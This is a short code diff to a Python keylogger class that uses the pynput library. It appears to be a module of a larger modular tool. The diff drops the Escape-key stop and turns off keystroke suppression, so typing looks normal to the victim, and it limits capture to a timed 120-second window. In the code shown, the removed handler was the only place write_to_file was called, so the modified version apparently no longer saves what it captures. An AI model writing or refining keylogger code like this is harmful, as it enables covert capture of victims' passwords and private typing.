@@ -2,6 +2,7 @@ import os
 import subprocess
 from basemodule import BaseModule
 from pynput.keyboard import Key, Listener
+import time
 
 
 class Keylogger(BaseModule):
@@ -10,11 +11,6 @@ class Keylogger(BaseModule):
 
     def on_press(self, key):
         self.keys.append(key)
-
-    def on_release(self, key):
-        if key == Key.esc:
-            self.write_to_file(self.keys)
-            return False
 
     def write_to_file(self, keys):
         keylog_dir = "../keylogs"
@@ -27,8 +23,9 @@ class Keylogger(BaseModule):
                 keylog_file.write(str(key))
 
     def run(self):
-        with Listener(on_press=self.on_press, on_release=self.on_release, suppress=True) as listener:
-            listener.join()
+        with Listener(on_press=self.on_press, suppress=False) as listener:
+            time.sleep(120)
+            listener.stop()
 
     def install_requirements(self):
         libraries = ["pynput"]
